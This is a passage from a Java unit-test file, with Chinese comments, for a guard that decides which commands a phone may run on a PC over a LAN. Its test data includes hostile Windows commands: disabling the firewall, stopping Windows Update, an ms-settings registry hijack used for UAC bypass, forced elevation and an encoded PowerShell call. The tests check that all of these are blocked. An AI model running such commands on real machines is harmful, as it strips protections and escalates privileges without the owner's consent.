        for (String cmd : new String[]{"settings", "pc_level", "plugin_off", "trust_add", "shortcut_approve"}) {
            PcGuard.Outcome o = g.check("phone", cmd, m("v", "full"));
            assertEquals(cmd, LinkPolicy.R_SELF_GRANT_BLOCKED, reason(o));
        }
        assertEquals("档位没被改掉", new LinkPolicy.Mode(FA, OR), c.mode());
        assertEquals(0, st.asked.size());
        // 经 sys_exec 改配置文件也不行
        assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, reason(g.check("phone", "sys_exec", m("command", "Set-Content " + c.file + " 'pc_sandbox=full_access'"))));
    }

    /** 工作区脚本：内容要管理员的不替你跑，告诉你自己用管理员身份运行。 */
    @Test public void workspaceScriptContentIsChecked() throws Exception {
        Config c = cfg(FA, OR);
        PcGuardTest.Stub st = new PcGuardTest.Stub();
        st.answer = PcGuard.ALLOW;
        PcGuard g = new PcGuard(c, st);
        Path dir = Path.of(c.workspaceDir, "scripts");
        Files.createDirectories(dir);
        Files.writeString(dir.resolve("ok.ps1"), "# 备份\nrobocopy D:\\照片 E:\\备份 /E\n");
        Files.write(dir.resolve("adm.ps1"), "netsh advfirewall set allprofiles state off\n".getBytes(StandardCharsets.UTF_8));
        Files.write(dir.resolve("up.ps1"), "Start-Process cmd -Verb RunAs\n".getBytes(StandardCharsets.UTF_8));
        assertNull("普通内容：确认后执行", g.check("phone", "script_run", m("name", "ok.ps1")).reply);
        PcGuard.Outcome o = g.check("phone", "script_run", m("name", "adm.ps1"));
        assertEquals(LinkPolicy.R_NEEDS_ADMIN_SCRIPT, reason(o));
        assertEquals("scripts/adm.ps1", o.reply.data.get("path"));
        assertTrue(o.reply.text, o.reply.text.contains("自己用管理员身份执行"));
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, reason(g.check("phone", "script_run", m("name", "up.ps1"))));
    }

    /** SHORTCUT：按新规则放宽（普通用户能做的放行），要管理员 / 影响提权 / 编码的仍不能批准。 */
    @Test public void shortcutFollowsNewRules() throws Exception {
        Config c = cfg(WS, UN);
        c.scriptsDir = Files.createTempDirectory("plug-sc").toString();
        PcGuardTest.Stub st = new PcGuardTest.Stub();
        PcGuard g = new PcGuard(c, st);
        String[][] ok = {{"打开相册.ps1", "explorer.exe D:\\照片"}, {"改主题.ps1", "reg add HKCU\\Software\\MyApp /v theme /d dark /f"},
                {"清理.bat", "@echo off\r\nREM 不碰 registry / proxy\r\ndel /q \"%USERPROFILE%\\Downloads\\*.tmp\"\r\n"},
                {"代理.ps1", "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name ProxyEnable -Value 1"}};
        for (String[] x : ok) {
            Files.writeString(Path.of(c.scriptsDir, x[0]), x[1]);
            st.answer = PcGuard.ALWAYS;
            assertNull(x[0] + " 应能批准", g.check("phone", "shortcut_run", m("name", x[0])).reply);
            assertNotNull(x[0], g.approvals().get(x[0].toLowerCase(java.util.Locale.ROOT)));
        }
        String[][] bad = {{"防火墙.ps1", "netsh advfirewall set allprofiles state off"}, {"服务.ps1", "Stop-Service wuauserv"},
                {"劫持.ps1", "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d cmd.exe /f"},
                {"提权.ps1", "Start-Process cmd -Verb RunAs"}, {"编码.ps1", "powershell -enc QUJDREVGR0hJSktMTU5PUFFS"}};
        for (String[] x : bad) {
            Files.writeString(Path.of(c.scriptsDir, x[0]), x[1]);
            st.answer = PcGuard.ALWAYS;
            int asked = st.asked.size();
            PcGuard.Outcome o = g.check("phone", "shortcut_run", m("name", x[0]));
            assertEquals(x[0], LinkPolicy.R_SHORTCUT_BLOCKED, reason(o));
            assertEquals(x[0] + " 不该问", asked, st.asked.size());
            assertNull(x[0], g.approvals().get(x[0].toLowerCase(java.util.Locale.ROOT)));
        }
    }

    /** 端到端：手机（另一端）经局域网下令，电脑回插件原因码；完全访问 · 从不询问下普通命令真的执行，OneSay 是管理员时拒绝。 */
    @Test public void endToEndPluginReasonCodesAndExecution() throws Exception {
        int port = LanTest.freePortPair();
        Config pcCfg = LanTest.pc(port);
        pcCfg.workspaceDir = Files.createTempDirectory("plug-e2e").toFile().getCanonicalPath();
        pcCfg.setMode(new LinkPolicy.Mode(FA, NV));
        StringBuilder log = new StringBuilder();
        Agent agent = new Agent(pcCfg, new Main.TestActions(), x -> { synchronized (log) { log.append(x).append('\n'); } });
        agent.confirms.onNew = d -> { };
        agent.start();
        Thread.sleep(300);
        Path out = Files.createTempDirectory("plug-e2e-out");
        try {
            Config cli = LanTest.client(pcCfg, "127.0.0.1:" + port);
            assertEquals(1, Cli.send(cli, "pc-lan", "sys_exec", m("command", "Start-Process cmd -Verb RunAs"), out, 10));
            assertEquals(1, Cli.send(cli, "pc-lan", "sys_exec", m("command", "netsh advfirewall set allprofiles state off"), out, 10));
            assertEquals(1, Cli.send(cli, "pc-lan", "settings", m("pc_sandbox", "full_access"), out, 10));
            assertEquals(1, Cli.send(cli, "pc-lan", "sys_exec", m("command", "echo plugin_enabled=off"), out, 10));
            String l = log.toString();
            assertTrue(l, l.contains(LinkPolicy.R_PLUGIN_BLOCKED));
            assertTrue(l, l.contains(LinkPolicy.R_NEEDS_ADMIN_SCRIPT));
            assertTrue(l, l.contains(LinkPolicy.R_SELF_GRANT_BLOCKED));
            File[] sc = new File(pcCfg.workspaceDir, "scripts").listFiles();
            assertNotNull(sc);
            assertEquals("只为要管理员的那条生成了脚本", 1, sc.length);
            if (!SafeExec.WINDOWS) {
                // 完全访问 · 从不询问：普通命令直接执行（不提权）
                SafeExec.reset(() -> false, null);
                Path marker = Path.of(pcCfg.workspaceDir, "ran.txt");
                assertEquals(0, Cli.send(cli, "pc-lan", "sys_exec", m("command", "echo hi > ran.txt"), out, 10));
                assertTrue("命令在工作区里执行了", Files.exists(marker));
                // OneSay 自己是管理员：远程子进程降不了权 → 拒绝，不执行
                SafeExec.reset(() -> true, null);
                Files.delete(marker);
                assertEquals(1, Cli.send(cli, "pc-lan", "sys_exec", m("command", "echo hi > ran.txt"), out, 10));
                assertFalse("管理员身份下没执行", Files.exists(marker));
                // 写工作区外（完全访问按当前用户权限）：没提权时写得进去，管理员身份时拒
                Path outside = Files.createTempDirectory("plug-outside").resolve("a.txt");
                SafeExec.reset(() -> false, null);
                assertEquals(0, Cli.send(cli, "pc-lan", "file_write", m("path", outside.toString(), "text", "来自手机"), out, 10));
                assertEquals("来自手机", Files.readString(outside));
                SafeExec.reset(() -> true, null);
                assertEquals(1, Cli.send(cli, "pc-lan", "file_write", m("path", outside.toString(), "text", "又来"), out, 10));
                assertEquals("来自手机", Files.readString(outside));
                // 远程不能写 OneSay 自己的配置文件
                SafeExec.reset(() -> false, null);
                String before = Files.exists(pcCfg.file) ? Files.readString(pcCfg.file) : null;
                log.setLength(0);
                assertEquals(1, Cli.send(cli, "pc-lan", "file_write", m("path", pcCfg.file.toAbsolutePath().toString(), "text", "pc_sandbox=full_access"), out, 10));
                assertEquals("配置文件没被改", before, Files.exists(pcCfg.file) ? Files.readString(pcCfg.file) : null);
                assertTrue(log.toString(), log.toString().contains(LinkPolicy.R_SELF_GRANT_BLOCKED));
            }
        } finally {
            agent.stop();
        }
    }
}
